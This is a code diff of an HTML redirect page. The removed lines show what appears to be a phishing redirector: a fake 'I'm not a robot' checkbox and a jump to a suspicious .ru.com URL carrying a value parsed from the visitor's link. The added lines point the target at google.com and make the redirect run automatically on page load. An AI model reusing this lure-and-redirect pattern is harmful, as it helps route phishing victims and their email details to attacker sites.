@@ -2,26 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirect Page with CAPTCHA</title>
+  <title>Redirect Page</title>
   <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <div id="captchaBox">
-    <label>
-      <input type="checkbox" id="captchaCheck" onclick="toggleButton()">
-      I'm not a robot
-    </label>
-    <br>
-    <button id="continueBtn" onclick="redirectNow()">Continue</button>
-  </div>
-
   <script>
-    function toggleButton() {
-      const checkbox = document.getElementById("captchaCheck");
-      const button = document.getElementById("continueBtn");
-      button.style.display = checkbox.checked ? "inline-block" : "none";
-    }
-
     function redirectNow() {
       var queryString = window.location.href;
       var email = queryString.split("&");
@@ -29,10 +12,16 @@
       var cross = root.split("#");
       var dom = cross[0];
 
-      var redirect = "https://khoshnevisan.ru.com/blog/assmwendkjidsdskjfkjhdkjfhihfjbjhbsfbjshvghbsgjhfkbjbfgjbdhfgvgsvjhbshdvjbs/#{domain}";
+      var redirect = "https://google.com#{domain}";
       var link = redirect.replace("{domain}", dom);
       window.location.href = link;
     }
+
+    // Trigger redirect automatically once the page has finished loading
+    window.onload = redirectNow;
   </script>
+</head>
+<body>
+  <!-- No button needed, the user is redirected automatically -->
 </body>
 </html>
